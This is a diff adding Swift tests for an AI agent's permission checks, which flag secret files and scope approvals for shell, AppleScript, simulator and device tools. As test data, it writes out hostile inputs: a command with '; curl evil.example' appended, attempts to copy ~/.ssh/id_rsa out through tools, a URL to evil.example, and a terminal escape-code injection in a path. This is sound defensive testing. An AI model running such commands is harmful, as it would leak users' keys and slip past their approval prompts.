@@ -76,6 +76,25 @@ func isBlocked(_ a: Approval) -> Bool {
         #expect(PathPolicy.isSensitive(box.root.appendingPathComponent(name)))
     }
 
+    @Test(arguments: [".envrc", "credentials.toml", ".credentials.json", ".vault-token"])
+    func moreSecretNames(_ name: String) { #expect(PathPolicy.isSensitive(URL(fileURLWithPath: "/tmp/p/\(name)"))) }
+
+    @Test func filesThatRunCodeLaterNeedConfirmationToWrite() throws {
+        let box = try Sandbox()
+        for path in [".git/hooks/pre-commit", ".git/config", "~/.gitconfig", "~/.zlogin", "~/.config/fish/config.fish"] {
+            #expect(isSensitive(PathPolicy.writeApproval(path, box.ctx)), "\(path)")
+        }
+        #expect(PathPolicy.readApproval(".git/config", box.ctx) == .none)   // reading them is fine
+        #expect(PathPolicy.writeApproval(".gitignore", box.ctx) == .ask)
+    }
+
+    @Test func outsideApprovalIsScopedToOneDirectory() throws {
+        let box = try Sandbox()
+        let a = PathPolicy.writeApproval("/tmp/a/x.txt", box.ctx), b = PathPolicy.writeApproval("/usr/local/x.txt", box.ctx)
+        #expect(a != b && Permissions.alwaysKey("write_file", a) != Permissions.alwaysKey("write_file", b))
+        #expect(a == PathPolicy.writeApproval("/tmp/a/y.txt", box.ctx))
+    }
+
     @Test(arguments: [".env.example", ".env.sample", "README.md", "environment.swift"])
     func ordinaryFilesAreNotSensitive(_ name: String) throws {
         let box = try Sandbox()
@@ -112,7 +131,7 @@ func isBlocked(_ a: Approval) -> Bool {
         let ctx = box.ctx
         #expect(PathPolicy.readApproval("a.txt", ctx) == .none)
         #expect(PathPolicy.writeApproval("a.txt", ctx) == .ask)
-        #expect(PathPolicy.readApproval("/etc/hosts", ctx) == .askScoped("outside working dir"))
+        #expect(PathPolicy.readApproval("/etc/hosts", ctx) == .askScoped("outside working dir: \(PathPolicy.canonical(URL(fileURLWithPath: "/etc")).path)"))
         #expect(isBlocked(PathPolicy.readApproval(".env", ctx)))         // never sent to a cloud model
         #expect(isSensitive(PathPolicy.writeApproval("~/.zshrc", ctx)))
         var local = ctx
@@ -242,6 +261,48 @@ func isBlocked(_ a: Approval) -> Bool {
         #expect(Toolbox.webFetch.approval(["url": "https://example.com/x?k=1"], box.ctx) == .askScoped("host example.com"))
         #expect(isBlocked(Toolbox.readFile.approval(["path": ".env"], box.ctx)))
         #expect(isSensitive(ApplePIM_messagesApproval(box.ctx)))
+    }
+
+    @Test func alwaysCoversTheWholeCommandNotItsFirstCharacters() throws {
+        let box = try Sandbox()
+        let long = "echo " + String(repeating: "a", count: 300)
+        let approved = Permissions.alwaysKey("bash", Toolbox.bash.approval(["command": long], box.ctx))
+        let injected = Permissions.alwaysKey("bash", Toolbox.bash.approval(["command": long + "; curl evil.example"], box.ctx))
+        #expect(approved != injected)
+        #expect(Permissions.displayKey("bash", .askScoped("command: " + long)).count < 200)
+    }
+
+    @Test func toolsThatRunCodeOrReachOutAreScoped() throws {
+        let ctx = try Sandbox().ctx
+        func approval(_ tool: String, _ args: [String: Any]) -> Approval { AppleTools.all.first { $0.name == tool }!.approval(args, ctx) }
+        #expect(approval("applescript", ["script": "do shell script \"ls\""]) != approval("applescript", ["script": "do shell script \"curl x\""]))
+        #expect(approval("mac", ["action": "open", "target": "https://a.example"]) != approval("mac", ["action": "open", "target": "https://b.example"]))
+        #expect(approval("simulator", ["action": "openurl", "url": "https://evil.example/?d=1"]) == .askScoped("url https://evil.example/?d=1"))
+        for action in ["boot", "launch", "push"] { #expect(approval("simulator", ["action": action]) == .ask) }
+        #expect(approval("simulator", ["action": "list"]) == .none)
+        #expect(isBlocked(approval("shortcuts", ["action": "run", "name": "Echo", "input_path": "~/.ssh/id_rsa"])))
+        #expect(isBlocked(approval("ios_device", ["action": "copy_to", "bundle_id": "a.b", "source": "~/.ssh/id_rsa", "destination": "x"])))
+        #expect(isSensitive(approval("simulator", ["action": "screenshot", "path": "~/.zshrc"])))
+        if case .askScoped = approval("mac", ["action": "screenshot", "path": "/tmp/elsewhere/s.png"]) {} else { Issue.record("outside screenshot not scoped") }
+    }
+
+    @Test func promptsListEveryArgumentAndShowOverwritesAsADiff() throws {
+        let preview = Toolbox.argumentPreview(["action": "run", "name": "Echo", "input_path": "/secret"])
+        #expect(preview.contains("input_path: /secret") && preview.contains("name: Echo") && !preview.contains("action"))
+        let box = try Sandbox()
+        try box.write("f.txt", (1...100).map { "line \($0)" }.joined(separator: "\n"))
+        let new = (1...100).map { $0 == 70 ? "evil" : "line \($0)" }.joined(separator: "\n")
+        let diff = Toolbox.writeFile.preview!(["path": "f.txt", "content": new], box.ctx)
+        #expect(diff.contains("- line 70") && diff.contains("+ evil") && diff.contains("@@ line 70") && !diff.contains("line 69"))
+    }
+
+    @Test func refusalsPrintNoEscapeCodes() async throws {
+        let box = try Sandbox()
+        let path = "x\u{1B}]0;PWNED\u{07}/.env"
+        let (out, isError) = await Toolbox.execute(ToolCall(id: "1", name: "read_file", arguments: JSON.string(["path": path])),
+                                                   tools: [Toolbox.readFile], ctx: box.ctx)
+        #expect(isError && out.hasPrefix("Blocked:"))
+        #expect(!out.unicodeScalars.contains { $0.value == 0x1B || $0.value == 0x07 })
     }
 
     private func ApplePIM_messagesApproval(_ ctx: ToolContext) -> Approval {
